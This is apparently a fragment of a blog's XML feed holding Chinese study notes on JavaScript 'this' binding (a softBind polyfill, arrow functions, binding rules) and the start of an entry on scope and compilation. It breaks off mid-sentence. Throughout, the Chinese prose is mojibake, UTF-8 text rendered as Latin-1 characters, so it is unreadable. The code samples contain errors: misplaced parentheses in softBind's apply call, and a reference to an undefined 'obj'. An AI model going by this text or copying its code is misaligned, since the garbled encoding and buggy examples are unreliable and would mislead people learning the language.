è½¯ç»‘å®šä¹‹å‰æˆ‘ä»¬å·²ç»çœ‹åˆ°è¿‡äº†ï¼Œç¡¬ç»‘å®šè¿™ç§æ–¹å¼ æŠŠ this å¼ºåˆ¶ç»‘å®šåˆ°æŒ‡å®šçš„å¯¹è±¡ï¼ˆé™¤äº†ä½¿ç”¨ new æ—¶ï¼‰ï¼Œé˜²æ­¢å‡½æ•°è°ƒç”¨åº”ç”¨é»˜è®¤ç»‘å®šè§„åˆ™ã€‚é—®é¢˜åœ¨äºŽï¼Œç¡¬ç»‘å®šä¼šå¤§å¤§é™ä½Žå‡½æ•°çš„çµæ´»æ€§ï¼Œä½¿ç”¨ç¡¬ç»‘å®šä¹‹åŽå°±æ— æ³•ä½¿ç”¨éšå¼ç»‘å®šæˆ–è€…æ˜¾å¼ç»‘å®šæ¥ä¿®æ”¹ thisã€‚ å¦‚æžœå¯ä»¥ç»™é»˜è®¤ç»‘å®šæŒ‡å®šä¸€ä¸ªå…¨å±€å¯¹è±¡å’Œ undefined ä»¥å¤–çš„å€¼ï¼Œé‚£å°±å¯ä»¥å®žçŽ°å’Œç»‘å®šç›¸åŒçš„æ•ˆæžœï¼ŒåŒæ—¶ä¿ç•™éšå¼ç»‘å®šæˆ–è€…æ˜¾å¼ç»‘å®šä¿®æ”¹ this çš„åŠŸèƒ½ã€‚ å¯ä»¥é€šè¿‡ä¸€ç§è¢«ç§°ä¸ºè½¯æ¿å®šçš„æ–¹æ³•æ¥å®žçŽ°æˆ‘ä»¬æƒ³è¦çš„æ•ˆæžœï¼š 123456789101112if(!Function.prototype.softBind)&#123; Function.prototype.softBind = function(obj)&#123; var fn = this; // æ•èŽ·æ‰€æœ‰ curried å¯¹è±¡ var curried = [].slice.call(arguments,1); var bound = function()&#123; return fn.apply((!this || this === (window || global)?obj:this,curried.concat.apply(curried,arguments))); &#125; bound.prototype = Object.create(fn.prototype); return bound; &#125;&#125; é™¤äº†è½¯ç»‘å®šä¹‹å¤–ï¼ŒsoftBind(â€¦)å…¶ä»–åŽŸç†å’Œ ES5 å†…ç½®çš„bindï¼ˆâ€¦ï¼‰ç±»ä¼¼ã€‚å®ƒä¼šå¯¹æŒ‡å®šçš„å‡½æ•°è¿›è¡Œå°è£…ï¼Œé¦–å…ˆæ£€æŸ¥è°ƒç”¨æ—¶ this ,å¦‚æžœ this ç»‘å®šåˆ°å…¨å±€å¯¹è±¡æˆ–è€… undefined ï¼Œé‚£å°±æŠŠæŒ‡å®šçš„é»˜è®¤å¯¹è±¡ obj ç»‘å®šåˆ° thisï¼Œå¦åˆ™å°±ä¸ä¼šä¿®æ”¹ this.æ­¤å¤–ï¼Œè¿™æ®µä»£ç è¿˜æ”¯æŒå¯é€‰çš„æŸ¯é‡ŒåŒ– ä¸‹é¢çœ‹è¿™ä¸ªå‡½æ•°çš„è°ƒç”¨ï¼š 123456789101112131415function foo()&#123; console.log("name:"+this.name);&#125;var obj1 = &#123;name: "obj"&#125;, obj2 = &#123;name: "obj2"&#125;, obj3 = &#123;name: "obj3"&#125;;var fooOBJ = foo.softBind(obj);fooOBJ(); //name: objobj2.foo = foo.softBind(obj);obj2.foo(); // name: obj2fooOBJ.call(obj3); // name: obj3setTimeout(obj2.foo,10); // name: obj å¯ä»¥çœ‹åˆ°ï¼Œè½¯ç»‘å®šç‰ˆæœ¬çš„ foo() å¯ä»¥æ‰‹åŠ¨å°† this ç»‘å®šåˆ° obj2 æˆ–è€… obj3 ä¸Šï¼Œä½†å¦‚æžœåº”ç”¨é»˜è®¤ç»‘å®šï¼Œåˆ™ä¼šæŠŠ this ç»‘å®šåˆ° objã€‚ this è¯æ³•ES6ä¸­ä»‹ç»äº†ä¸€ç§æ— æ³•ä½¿ç”¨å‰é¢è¿™äº›è§„åˆ™çš„ç‰¹æ®Šå‡½æ•°ç±»åž‹ï¼šç®­å¤´å‡½æ•° ç®­å¤´å‡½æ•°å¹¶ä¸æ˜¯ä½¿ç”¨ function å…³é”®å­—å®šä¹‰çš„ï¼Œè€Œæ˜¯ä½¿ç”¨è¢«ç§°ä¸ºâ€œèƒ–ç®­å¤´â€çš„æ“ä½œç¬¦ =&gt; å®šä¹‰çš„ï¼Œç®­å¤´å‡½æ•°ä¸ä½¿ç”¨ this çš„å››ç§æ ‡å‡†è§„åˆ™ï¼Œè€Œæ˜¯æ›´åŠ å¤–å±‚ï¼ˆå‡½æ•°æˆ–è€…å…¨å±€ï¼‰ä½œç”¨åŸŸæ¥å†³å®š this. çœ‹çœ‹ç®­å¤´å‡½æ•°çš„è¯æ³•ä½œç”¨åŸŸï¼š 123456789101112131415function foo()&#123; // è¿”å›žä¸€ä¸ªç®­å¤´å‡½æ•° return (a) =&gt;&#123; // this ç»§æ‰¿æ¥è‡ª foo() console.log(a); &#125;&#125;var obj1 = &#123; a:2&#125;var obj2 = &#123; a:3&#125;var bar = foo.call(obj1);bar.call(obj2); // 2ä¸æ˜¯ 3 foo() å†…éƒ¨åˆ›å»ºçš„ç®­å¤´å‡½æ•°ä¼šæ•èŽ·è°ƒç”¨æ—¶ foo() çš„thisã€‚ç”±äºŽ foo() çš„this ç»‘å®šåˆ°obj1 ã€‚bar(åŒ»ç”¨ç®­å¤´å‡½æ•°çš„)this ä¹Ÿä¼šç»‘å®šåœ¨ obj1,ç®­å¤´å‡½æ•°çš„ç»‘å®šæ— æ³•è¢«ä¿®æ”¹ã€‚ï¼ˆnew ä¹Ÿä¸è¡Œï¼‰ ç®­å¤´å‡½æ•°æœ€å¸¸ç”¨äºŽå›žè°ƒå‡½æ•°ï¼Œä¾‹å¦‚äº‹ä»¶å¤„ç†å™¨æˆ–è€…æ˜¯å®šæ—¶å™¨ 12345678910function foo()&#123; setTimeout(()=&gt;&#123; // è¿™é‡Œçš„ this åœ¨è¯æ³•ä¸Šç»§æ‰¿è‡ª foo() console.log(this.a): &#125;);&#125;var obj = &#123; a:2&#125;foo.call(obj); //2 è™½ç„¶ self = this å’Œç®­å¤´å‡½æ•°çœ‹èµ·æ¥éƒ½å¯ä»¥å–ä»£ bind(â€¦)ï¼Œä½†ä»Žæœ¬è´¨ä¸Šè®²ï¼Œå®ƒä»¬æƒ³æ›¿ä»£çš„æ˜¯ this æœºåˆ¶ã€‚ å¦‚æžœä½ ç»å¸¸ç¼–å†™ this é£Žæ ¼çš„ä»£ç ï¼Œä½†æ˜¯ç»å¤§éƒ¨åˆ†æ—¶å€™éƒ½ä¼šä½¿ç”¨ self = this æˆ–è€… ç®­å¤´å‡½æ•°æ¥å¦å®š this æœºåˆ¶ï¼Œé‚£ä½ æˆ–è€…åº”å½“ï¼š åªé‡‡ç”¨è¯æ³•ä½œç”¨åŸŸå¹¶ä¸”å®Œå…¨æŠ›å¼ƒé”™è¯¯ this é£Žæ ¼çš„ä»£ç  å®Œå…¨é‡‡ç”¨ this é£Žæ ¼ï¼Œåœ¨å¿…è¦æ—¶ä½¿ç”¨ bind(â€¦)ï¼Œå°½é‡é¿å…ä½¿ç”¨ self = this å’Œç®­å¤´å‡½æ•° å½“ç„¶åŒ…å«è¿™ä¸¤ç§é£Žæ ¼çš„ç¨‹åºå¯ä»¥æ­£å¸¸è¿è¡Œï¼Œå¤§é‚£æ˜¯åœ¨åŒä¸€ä¸ªå‡½æ•°æˆ–è€…åŒä¸€ä¸ªç¨‹åºæ±‡æ€»æ··åˆä½¿ç”¨è¿™ä¸¤ç§é£Žæ ¼é€šå¸¸ä¼šä½¿å¾—ä»£ç æ›´éš¾ç»´æŠ¤ï¼Œå¹¶ä¸”å¯èƒ½ä¹Ÿä¼šæ›´éš¾ç¼–å†™ã€‚ å°ç»“å¦‚æžœè¦åˆ¤æ–­ä¸€ä¸ªè¿è¡Œä¸­å‡½æ•°çš„ this ç»‘å®šï¼Œå°±éœ€è¦æ‰¾åˆ°è¿™ä¸ªå‡½æ•°çš„ç›´æŽ¥è°ƒç”¨ä½ç½®ã€‚æ‰¾åˆ°ä¹‹åŽå°±å¯ä»¥é¡ºåºåº”ç”¨ä¸‹é¢è¿™å››æ¡è§„åˆ™æ¥åˆ¤æ–­ this çš„ç»‘å®šå¯¹è±¡ã€‚ ç”±new è°ƒç”¨ï¼Ÿç»‘å®šåˆ°æ–°åˆ›å»ºçš„å¯¹è±¡ ç”±call æˆ–è€… apply ã€bind è°ƒç”¨ï¼Ÿç»‘å®šåˆ°æŒ‡å®šå¯¹è±¡ ç”±ä¸Šä¸‹æ–‡å¯¹è±¡è°ƒç”¨ï¼Ÿç»‘å®šåˆ°é‚£ä¸ªä¸Šä¸‹æ–‡å¯¹è±¡ é»˜è®¤ï¼šåœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹ç»‘å®šåˆ° undefined ï¼Œå¦åˆ™ç»‘å®šåˆ°å…¨å±€å¯¹è±¡ ä¸€å®šè¦æ³¨æ„ï¼Œæœ‰äº›è°ƒç”¨å¯èƒ½åœ¨æ— æ„æˆ–è€…æœ‰æ„ä½¿ç”¨ é»˜è®¤è§„åˆ™ï¼Œå¦‚æžœæƒ³è¦æ›´å®‰å…¨åœ°å¿½ç•¥ this ç»‘å®šï¼Œå¯ä»¥ä½¿ç”¨ä¸€ä¸ªDMZ å¯¹è±¡ï¼Œæ¯”å¦‚ âˆ… = Object.create(null);ä»¥ä¿æŠ¤å…¨å±€å¯¹è±¡ã€‚ ES6 ä¸­çš„ç®­å¤´å‡½æ•°å¹¶ä¸ä¼šä½¿ç”¨å››æ¡è§„åˆ™ï¼Œè€Œæ˜¯æ ¹æ®å½“å‰çš„è¯æ³•ä½œç”¨åŸŸæ¥å†³å®š this,å…·ä½“æ¥è¯´ï¼Œç®­å¤´å‡½æ•°ä¼šç»§æ‰¿å¤–å±‚å‡½æ•°è°ƒç”¨çš„ this ç»‘å®šï¼ˆæ— è®º this ç»‘å®šåˆ°äº†ä»€ä¹ˆï¼‰ã€‚è¿™å…¶å®žå’Œ ES6 ä¹‹å‰ä»£ç çš„ self = this æœºåˆ¶æ˜¯ä¸€æ ·çš„ã€‚]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>ä½ ä¸çŸ¥é“çš„JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½ ä¸çŸ¥é“çš„JavaScript(ä¸Š)â€”â€”ä½œç”¨åŸŸå’Œé—­åŒ…]]></title>
    <url>%2F2019-01-15-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JavaScript(%E4%B8%8A)%E2%80%94%E2%80%94%E4%BD%9C%E7%94%A8%E5%9F%9F%E5%92%8C%E9%97%AD%E5%8C%85.html</url>
    <content type="text"><![CDATA[è¿™ä¸ªç³»åˆ—çš„ä½œå“æ˜¯ä¸Šä¸€æ¬¡å½“å½“ç½‘æœ‰æ´»åŠ¨ä¹°çš„ï¼Œè®°å¾—æ˜¯ä¸Šä¸€å¹´ä¹æœˆä»½å¼€å­¦å­£çš„æ—¶å€™äº†ã€‚åŽé¢ä¸€ç›´æœ‰å…¶ä»–çš„äº‹æƒ…ï¼Œæˆ–è€…è‡ªèº«ä¸€äº›å› ç´ ï¼Œè¿Ÿè¿Ÿæ²¡æœ‰å¼€å°è¿™æœ¬ä¹¦ã€‚ä»Šå¤©ç«‹ä¸‹ä¸€ä¸ª flagï¼Œå¸Œæœ›å¯ä»¥åœ¨ä¸¤ä¸ªæœˆå†…çœ‹å®Œå¹¶è®°å½•è¿™ä¸ªç³»åˆ—çš„ä¸‰æœ¬ä¹¦ï¼Œä¿æŒå­¦ä¹ çš„æ¿€æƒ…ï¼Œä¸æ–­å¼¥è¡¥è‡ªå·±çš„åŸºç¡€ä¸å¤Ÿæ‰Žå®žçš„ç¼ºç‚¹ã€‚ ä½œè€…çš„github ä¹¦ç±çš„è´­ä¹°é“¾æŽ¥ï¼Œè‡ªå·±æœã€‚ ä½ ä¸çŸ¥é“çš„JavaScript(ä¸Š)â€”â€”ä½œç”¨åŸŸå’Œé—­åŒ…ä½œç”¨åŸŸå’Œé—­åŒ…ä½œç”¨åŸŸæ˜¯ä»€ä¹ˆï¼Ÿ å‡ ä¹Žæ‰€æœ‰çš„ç¼–ç¨‹è¯­è¨€çš„åŸºæœ¬çš„åŠŸèƒ½ä¹‹ä¸€ï¼Œå°±æ˜¯èƒ½å¤Ÿå­˜å˜é‡å½“ä¸­çš„å€¼ï¼Œå¹¶ä¸”èƒ½å¯¹è¿™ä¸ªå€¼è¿›è¡Œè®¿é—®å’Œä¿®æ”¹ã€‚äº‹å®žä¸Šï¼Œæ­£æ˜¯è¿™ç§å­˜å‚¨å’Œè®¿é—®å˜é‡çš„å€¼çš„èƒ½åŠ›å°†çŠ¶æ€å¸¦ç»™äº†ç¨‹åºã€‚ å°†å˜é‡å¼•å…¥ç¨‹åºä¼šäº§ç”Ÿå‡ ä¸ªæ„æ€çš„é—®é¢˜ï¼šè¿™äº›å˜é‡å­˜å‚¨åœ¨å“ªé‡Œï¼Œæœ€é‡è¦çš„æ˜¯æˆ‘ä»¬æ€Žä¹ˆæ‰¾åˆ°å®ƒä»¬ï¼Œè¿™äº›é—®é¢˜è¯´æ˜Žéœ€è¦è®¾è®¡ä¸€å¥—è‰¯å¥½çš„è§„åˆ™æ¥å­˜å‚¨å˜é‡ï¼Œå¹¶ä¸”ä¹‹åŽå¯ä»¥æ–¹ä¾¿åœ°æ‰¾åˆ°è¿™äº›å˜é‡ï¼Œè¿™å¥—è§„åˆ™è¢«ç§°ä¸ºä½œç”¨åŸŸã€‚ ç¼–è¯‘åŽŸç†å°½ç®¡ç»å¸¸å°† JavaScript å½’ç±»ä¸ºâ€œåŠ¨æ€â€æˆ–è€…æ˜¯â€œè§£é‡Šæ‰§è¡Œâ€è¯­è¨€ï¼Œä½†äº‹å®žä¸Šå®ƒæ˜¯ä¸€é—¨ç¼–è¯‘è¯­è¨€ã€‚ä¸Žä¼ ç»Ÿçš„ç¼–è¯‘è¯­è¨€ä¸åŒçš„æ˜¯å®ƒä¸æ˜¯æå‰ç¼–è¯‘çš„ï¼Œç¼–è¯‘ç»“æžœä¹Ÿä¸èƒ½åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­è¿›è¡Œç§»æ¤ã€‚å°½ç®¡è¿™æ ·ï¼ŒJavaScript å¼•æ“Žè¿›è¡Œç¼–è¯‘çš„æ­¥éª¤å’Œä¼ ç»Ÿçš„ç¼–è¯‘éžå¸¸ç›¸ä¼¼ï¼Œåœ¨æŸäº›çŽ¯èŠ‚å¯èƒ½æ¯”é¢„æƒ³çš„è¦å¤æ‚ã€‚ åœ¨ä¼ ç»Ÿçš„ç¼–è¯‘è¯­è¨€çš„æµç¨‹ä¸­ï¼Œç¨‹åºä¸­çš„ä¸€æ®µæºä»£ç åœ¨æ‰§è¡Œä¹‹å‰ä¼šç»åŽ†ä¸‰ä¸ªæ­¥éª¤ï¼Œç»Ÿç§°ä¸ºâ€œç¼–è¯‘â€ã€‚ åˆ†è¯/è¯æ³•åˆ†æžï¼ˆTokenizing/Lexingï¼‰ è¿™ä¸ªè¿‡ç¨‹ä¼šå°†æœ‰å­—ç¬¦ç»„æˆçš„å­—ç¬¦ä¸²åˆ†è§£æˆï¼ˆå¯¹ç¼–è¯‘è¯­è¨€æ¥è¯´ï¼‰æœ‰æ„ä¹‰çš„ä»£ç å—ï¼Œè¿™äº›ä»£ç å—è¢«ç§°ä¸ºè¯æ³•å•å…ƒï¼ˆtokenï¼‰ã€‚ä¾‹å¦‚ï¼švar a = 2;è¿™æ®µç¨‹åºé€šå¸¸ä¼šè¢«åˆ†è§£æˆä¸‹é¢çš„è¯æ³•å•å…ƒï¼švarã€aã€=ã€2ã€;ã€‚ç©ºæ ¼æ˜¯å¦ä¼šè¢«å½“åšè¯æ³•å•å…ƒï¼Œå–å†³äºŽç©ºæ ¼åœ¨è¿™é—¨è¯­è¨€ä¸­æ˜¯å¦æœ‰æ„ä¹‰ã€‚ åˆ†è¯ï¼ˆtoknizingï¼‰ å’Œè¯æ³•åˆ†æžï¼ˆLexingï¼‰ä¹‹é—´çš„åŒºåˆ«æ˜¯éžå¸¸å¾®å¦™çš„ã€æ™¦æ¶©çš„ï¼Œä¸»è¦å·®å¼‚åœ¨äºŽè¯æ³•å•å…ƒçš„è¯†åˆ«æ˜¯é€šè¿‡æœ‰çŠ¶æ€è¿˜æ˜¯æ— çŠ¶æ€çš„æ–¹å¼è¿›è¡Œçš„ã€‚ç®€å•æ¥è¯´ï¼Œå¦‚æžœè¯æ³•å•å…ƒç”Ÿæˆå™¨åœ¨åˆ¤æ–­ a æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„è¯æ³•å•å…ƒè¿˜æ˜¯å…¶ä»–è¯æ³•å•å…ƒçš„ä¸€éƒ¨åˆ†æ—¶ï¼Œè°ƒç”¨çš„æ˜¯æœ‰çŠ¶æ€çš„è§£æžè§„åˆ™ï¼Œé‚£ä¹ˆè¿™ä¸ªè¿‡ç¨‹å°±è¢«ç§°ä¸ºè¯æ³•åˆ†æž è§£æž/è¯­æ³•åˆ†æžï¼ˆParsingï¼‰ è¿™ä¸ªè¿‡ç¨‹æ˜¯å°†è¯æ³•å•å…ƒæµï¼ˆæ•°ç»„ï¼‰è½¬æ¢æˆä¸€ä¸ªç”±å…ƒç´ é€çº§åµŒå¥—æ‰€ç»„æˆçš„ä»£è¡¨äº†ç¨‹åºè¯­æ³•ç»“æžœçš„æ ‘ã€‚è¿™ä¸ªæ ‘è¢«ç§°ä¸ºâ€œæŠ½è±¡è¯­æ³•æ ‘â€ï¼ˆAbstract Syntax Tree,ASTï¼‰ã€‚var a = 2;çš„æŠ½è±¡è¯­æ³•æ ‘ä¸­å¯èƒ½ä¼šæœ‰ä¸€ä¸ªå«åš VariableDeclarationçš„é¡¶çº§èŠ‚ç‚¹ï¼ŒæŽ¥ä¸‹æ¥æ˜¯ä¸€ä¸ªå«åš Identifierï¼ˆå®ƒçš„å€¼æ˜¯2ï¼‰çš„å­èŠ‚ç‚¹ï¼Œä»¥åŠä¸€ä¸ªå«åš AssignmentExpressionçš„å­èŠ‚ç‚¹ã€‚AssignmentExpressionèŠ‚ç‚¹æœ‰ä¸€ä¸ªå«åš NumericLiteralï¼ˆå®ƒçš„å€¼æ˜¯2ï¼‰çš„å­èŠ‚ç‚¹ã€‚ ä»£ç ç”Ÿæˆ å°† AST è½¬æ¢æˆå¯æ‰§è¡Œä»£ç çš„è¿‡ç¨‹è¢«ç§°ä¸ºä»£ç ç”Ÿæˆï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸Žè¯­è¨€ã€ç›®æ ‡å¹³å°ç­‰æ¯æ¯ç›¸å…³ã€‚æŠ›å¼€å…·ä½“ç»†èŠ‚ï¼Œç®€å•åœ°æ¥è¯´å°±æ˜¯æœ‰æŸç§æ–¹æ³•å¯ä»¥å°† var a = 2;çš„ASTè½¬åŒ–ä¸ºä¸€ç»„æœºå™¨æŒ‡ä»¤ï¼Œç”¨æ¥åˆ›å»ºä¸€ä¸ªå«åš a çš„å˜é‡ï¼ˆåŒ…æ‹¬åˆ†é…å†…å­˜ç­‰ï¼‰ï¼Œå¹¶å°†ä¸€ä¸ªå€¼å­˜å‚¨åœ¨ a ä¸­ã€‚ æ¯”èµ·é‚£äº›ç¼–è¯‘è¿‡ç¨‹åªæœ‰ä¸‰ä¸ªæ­¥éª¤çš„è¯­è¨€çš„ç¼–è¯‘å™¨ï¼ŒJavaScript å¼•æ“Žè¦å¤æ‚å¾—å¤šã€‚ä¾‹å¦‚ï¼Œåœ¨è¯­æ³•åˆ†æžå’Œä»£ç ç”Ÿæˆé˜¶æ®µæœ‰ç‰¹å®šçš„æ­¥éª¤æ¥å¯¹è¿è¡Œæ€§èƒ½è¿›è¡Œä¼˜åŒ–ï¼ŒåŒ…æ‹¬å¯¹å†—ä½™å…ƒç´ è¿›è¡Œä¼˜åŒ–ç­‰ã€‚ JavaScript å¼•æ“Žä¸ä¼šæœ‰å¤§é‡çš„æ—¶é—´æ¥ä¼˜åŒ–ï¼Œå› ä¸ºä¸Žå…¶ä»–è¯­è¨€ä¸åŒï¼ŒJavaScript çš„ç¼–è¯‘è¿‡ç¨‹ä¸æ˜¯å‘ç”Ÿåœ¨æž„å»ºä¹‹å‰çš„ã€‚å¤§éƒ¨åˆ†æƒ…å†µä¸‹ç¼–è¯‘å‘ç”Ÿåœ¨ä»£ç æ‰§è¡Œå‰çš„å‡ å¾®ç§’çš„æ—¶é—´å†…ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä»»ä½• JavaScript ä»£ç ç‰‡æ®µåœ¨æ‰§è¡Œå‰éƒ½è¦è¿›è¡Œç¼–è¯‘ï¼ˆé€šå¸¸å°±åœ¨ç¼–è¯‘å‰ï¼‰ã€‚å› æ­¤ï¼ŒJavaScript ç¼–è¯‘å™¨é¦–å…ˆä¼šå¯¹ var a = 2;è¿™æ®µç¨‹åºè¿›è¡Œç¼–è¯‘ï¼Œç„¶åŽåšå¥½æ‰§è¡Œå®ƒçš„å‡†å¤‡ï¼Œå¹¶ä¸”é€šå¸¸é©¬ä¸Šå°±ä¼šæ‰§è¡Œå®ƒã€‚ ç†è§£ä½œç”¨åŸŸå­¦ä¹ ä½œç”¨åŸŸçš„æ–¹å¼æ˜¯å°†è¿™ä¸ªæž„æˆæ¨¡æ‹Ÿæˆå‡ ä¸ªäººç‰©ä¹‹é—´çš„å¯¹è¯ï¼Œé‚£ä¹ˆï¼Œç”±è°è¿›è¡Œè¿™åœºå¯¹è¯å‘¢ï¼Ÿ æ¼”å‘˜è¡¨é¦–å…ˆä»‹ç»å°†è¦å‚ä¸Ž å¯¹ç¨‹åº var a = 2;è¿›è¡Œå¤„ç†çš„è¿‡ç¨‹ä¸­çš„æ¼”å‘˜ æ¼”å‘˜ æè¿° å¼•æ“Ž ä»Žå¤´åˆ°å°¾è´Ÿè´£æ•´ä¸ªJavaScript ç¨‹åºçš„ç¼–è¯‘ä»¥åŠæ‰§è¡Œè¿‡ç¨‹ ç¼–è¯‘å™¨ å¼•æ“Žçš„å¥½ç›†å‹ä¹‹ä¸€ï¼Œè´Ÿè´£è¯æ³•åˆ†æžä»¥åŠä»£ç ç”Ÿæˆçš„è„æ´»ç´¯æ´» ä½œç”¨åŸŸ å¼•æ“Žçš„å¦ä¸€ä½å¥½ç›†å‹ï¼Œè´Ÿè´£æ”¶é›†å¹¶ç»´æŠ¤ç”±æ‰€æœ‰å£°æ˜Žçš„æ ‡è¯†ç¬¦ï¼ˆå˜é‡ï¼‰ç»„æˆçš„ä¸€ç³»åˆ—æŸ¥è¯¢ï¼Œå¹¶å®žæ–½ä¸€å¥—éžå¸¸ä¸¥æ ¼çš„è§„åˆ™ï¼Œç¡®å®šå½“å‰æ‰§è¡Œçš„ä»£ç å¯¹è¿™äº›æ ‡è¯†ç¬¦çš„è®¿é—®æƒé™ å¯¹è¯var a = 2; ç¼–è¯‘å™¨é¦–å…ˆä¼šå°†è¿™æ®µç¨‹åºåˆ†è§£æˆè¯æ³•å•å…ƒï¼Œç„¶åŽå°†ä¼šè¯æ³•å•å…ƒè§£æžæˆä¸€ä¸ªæ ‘ç»“æž„ã€‚ä½†æ˜¯å½“ç¼–è¯‘å™¨å¼€å§‹è¿›è¡Œä»£ç ç”Ÿæˆæ—¶ï¼Œå®ƒå¯¹è¿™æ®µä»£ç çš„å¤„ç†æ–¹å¼ä¼šä¸Žé¢„æœŸæœ‰æ‰€ä¸åŒã€‚å¯ä»¥åˆç†åœ°å‡è®¾ç¼–è¯‘å™¨æ‰€äº§ç”Ÿçš„ä»£ç èƒ½å¤Ÿç”¨ä¸‹é¢çš„ä¼ªä»£ç è¿›è¡Œæ¦‚æ‹¬ï¼šä¸ºä¸€ä¸ªå˜é‡åˆ†é…ä¸€ä¸ªå†…å­˜ï¼Œå¹¶å°†å…¶å‘½åä¸º aï¼Œç„¶åŽå°†å€¼ 2 ä¿å­˜è¿›è¿™ä¸ªå˜é‡ã€‚ç„¶è€Œï¼Œè¿™å¹¶ä¸æ˜¯å®Œå…¨æ­£ç¡®çš„ã€‚ äº‹å®žä¸Šç¼–è¯‘å™¨ä¼šè¿›è¡Œä»¥ä¸‹å¤„ç† é‡åˆ° var aï¼Œç¼–è¯‘å™¨ä¼šè¯¢é—®ä½œç”¨åŸŸæ˜¯å¦å·²ç»æœ‰ä¸€ä¸ªè¯¥åç§°çš„å˜é‡å­˜åœ¨åŒä¸€ä¸ªä½œç”¨åŸŸçš„é›†åˆä¸­ï¼Œå¦‚æžœæ˜¯ï¼Œç¼–è¯‘å™¨ä¼šå¿½ç•¥è¯¥å£°æ˜Žï¼Œç»§ç»­ç¼–è¯‘ï¼›å¦åˆ™å®ƒä¼šæŒ‰è¦æ±‚ä½œç”¨åŸŸåœ¨å½“å‰ä½œç”¨åŸŸçš„é›†åˆä¸­å£°æ˜Žä¸€ä¸ªæ–°çš„å˜é‡ï¼Œå¹¶å‘½åä¸º a. æŽ¥ä¸‹æ¥ç¼–è¯‘å™¨ä¼šä¸ºå¼•æ“Žç”Ÿæˆè¿è¡Œæ—¶éœ€è¦çš„ä»£ç ï¼Œè¿™äº›ä»£ç è¢«ç”¨æ¥å¤„ç† a = 2è¿™ä¸ªèµ‹å€¼æ“ä½œï¼Œå¼•æ“Žè¿è¡Œæ—¶ä¼šé¦–å…ˆè¯¢é—®ä½œç”¨åŸŸï¼Œåœ¨å½“å‰çš„ä½œç”¨åŸŸé›†åˆä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªå«åš a çš„å˜é‡ï¼Œå¦‚æžœæ˜¯ å¼•æ“Žä¼šä½¿ç”¨è¿™ä¸ªå˜é‡ï¼Œå¦‚æžœæ²¡æœ‰ï¼Œå¼•æ“Žä¼šç»§ç»­æŸ¥æ‰¾è¯¥å˜é‡ å¦‚æžœå¼•æ“Žæœ€ç»ˆæ‰¾åˆ°äº† a å˜é‡ï¼Œä¼šå°† 2 èµ‹å€¼ç»™å®ƒã€‚å¦åˆ™å¼•æ“Žå°±ä¼šä¸¾æ‰‹ç¤ºæ„å¹¶æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ã€‚ æ€»ç»“ï¼šå˜é‡çš„èµ‹å€¼è¿‡ç¨‹ä¼šæ‰§è¡Œä¸¤ä¸ªåŠ¨ä½œï¼Œé¦–å…ˆç¼–è¯‘å™¨ä¼šåœ¨å½“å‰çš„ä½œç”¨åŸŸä¸­å£°æ˜Žä¸€ä¸ªå˜é‡ï¼ˆå¦‚æžœå®ƒä¹‹å‰æ²¡æœ‰å£°æ˜Žè¿‡ï¼‰ï¼Œç„¶åŽåœ¨è¿è¡Œæ—¶å¼•æ“Žä¼šåœ¨ä½œç”¨åŸŸä¸­æŸ¥æ‰¾è¯¥å˜é‡ï¼Œå¦‚æžœèƒ½å¤Ÿæ‰¾åˆ°å°±ä¼šå¯¹å®ƒèµ‹å€¼ã€‚ ç¼–è¯‘å™¨æœ‰è¯è¯´ç¼–è¯‘å™¨åœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­çš„ç¬¬äºŒæ­¥ç”Ÿæˆäº†ä»£ç ï¼Œå¼•æ“Žæ‰§è¡Œå®ƒçš„æ—¶å€™ï¼Œä¼šé€šè¿‡æŸ¥æ‰¾å˜é‡ a æ¥åˆ¤æ–­å®ƒæ˜¯å¦å·²å£°æ˜Žè¿‡ã€‚æŸ¥æ‰¾çš„è¿‡ç¨‹ç”±ä½œç”¨åŸŸè¿›è¡ŒååŠ©ï¼Œä½†æ˜¯å¼•æ“Žæ‰§è¡Œæ€Žä¹ˆæ ·çš„æŸ¥æ‰¾ï¼Œä¼šå½±å“æœ€ç»ˆçš„æŸ¥æ‰¾ç»“æžœã€‚ ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œå¼•æ“Žä¼šå¯¹ å˜é‡ a è¿›è¡Œ LHS æˆ–è€… RHS æŸ¥æ‰¾ã€‚å½“å˜é‡å‡ºçŽ°åœ¨èµ‹å€¼æ“ä½œçš„å·¦ä¾§çš„æ—¶å€™è¿›è¡Œ LHS æŸ¥è¯¢ï¼Œå¦åˆ™è¿›è¡Œ RHSã€‚RHSæŸ¥è¯¢ä¸Žç®€å•åœ°æŸ¥æ‰¾æŸä¸ªå˜é‡çš„å€¼æ˜¯ä¸€æ ·çš„é“ç†ï¼Œä½†æ˜¯ LHS æŸ¥è¯¢åˆ™æ˜¯è¯•å›¾æ‰¾åˆ°å˜é‡çš„å®¹å™¨æœ¬èº«ï¼Œä»Žè€Œå¯ä»¥å¯¹å…¶è¿›è¡Œèµ‹å€¼ã€‚ä»Žè¿™ä¸ªè§’åº¦è¯´ï¼ŒRHS å¹¶ä¸æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„ â€œèµ‹å€¼æ“ä½œçš„å³ä¾§â€ï¼Œæ›´å‡†ç¡®çš„è¯´æ˜¯â€œéžå·¦ä¾§â€ã€‚ RSHï¼ˆretrieve his source valueï¼‰å–åˆ°å®ƒçš„æºå€¼ã€‚ 1234console.log(a);// å…¶ä¸­å¯¹a çš„å¼•ç”¨æ˜¯ RHS å¼•ç”¨ï¼Œå› ä¸ºè¿™é‡Œ a å¹¶æ²¡æœ‰èµ‹å€¼ï¼Œç›¸åº”çš„éœ€è¦æŸ¥æ‰¾å¹¶å–å¾—açš„å€¼ï¼Œè¿™æ ·æ‰èƒ½å°†å€¼ä¼ é€’ç»™ console.log(..)a = 2;// è¿™é‡Œå¯¹ a çš„å¼•ç”¨åˆ™æ˜¯ LHS å¼•ç”¨ï¼Œå› 